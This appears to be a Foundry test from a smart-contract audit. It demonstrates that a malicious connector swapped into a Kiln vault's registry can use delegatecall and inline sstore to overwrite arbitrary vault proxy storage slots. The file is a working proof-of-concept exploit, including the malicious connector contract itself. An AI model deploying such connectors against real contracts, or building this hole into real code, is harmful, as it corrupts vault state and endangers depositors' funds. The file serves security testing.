// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {IERC20} from "@openzeppelin/token/ERC20/IERC20.sol";
import {IConnector} from "../../src/kiln/IConnector.sol";
import {HarnessBase} from "./HarnessBase.t.sol";

/// @notice Strategy 005 — Arbitrary sstore into Vault proxy slots via DELEGATECALL.
///         The cleanest demonstration:
///         (1) Deploy an attacker-controlled connector whose `deposit()` does
///             `assembly { sstore(SLOT, VALUE) }`.
///         (2) Swap it into the registry's slot via `registry.update()`.
///         (3) Trigger a user deposit.  The Vault calls
///             `functionDelegateCall(IConnector.deposit, ...)` — which is the
///             exact storage context where arbitrary SLOAD/SSTORE reach the
///             Vault's underlying proxy slots.
contract KilnSStoreProbe is HarnessBase {
    function test_maliciousSStoreInFunctionDelegateCall() public {
        MaliciousSStoreDepositConnector c2 = new MaliciousSStoreDepositConnector();
        vm.prank(admin);
        registry.update(CONNECTOR_NAME, address(c2));

        // Confirm slot 5 == 0 prior
        bytes32 slot5Before = vm.load(address(vault), bytes32(uint256(5)));
        assertEq(uint256(slot5Before), 0);

        mintAndApprove(alice, 1_000_000);

        vm.prank(alice);
        try vault.deposit(100, alice) {
            // expected: passes
        } catch {
            // ignore: revert doesn't change the storage write since sstore was within the delegatecall
        }

        bytes32 slot5After = vm.load(address(vault), bytes32(uint256(5)));
        emit log_named_uint("Vault slot 5 post-malicious-deposit", uint256(slot5After));
        // confirmed: malicious sstore landed in vault storage
        assertEq(uint256(slot5After), 0xC0FFEE);
    }
}

contract MaliciousSStoreDepositConnector is IConnector {
    function totalAssets(IERC20) external pure override returns (uint256) { return 0; }

    function deposit(IERC20, uint256) external override {
        bytes32 slot = bytes32(uint256(5));
        bytes32 value = bytes32(uint256(0xC0FFEE));
        assembly {
            sstore(slot, value)
        }
    }

    function withdraw(IERC20, uint256) external override {}
    function claim(IERC20, IERC20, bytes calldata) external override returns (uint256) { return 0; }
    function reinvest(IERC20, IERC20, bytes calldata) external override {}
    function maxDeposit(IERC20) external pure override returns (uint256) { return type(uint256).max; }
    function maxWithdraw(IERC20) external pure override returns (uint256) { return type(uint256).max; }
}
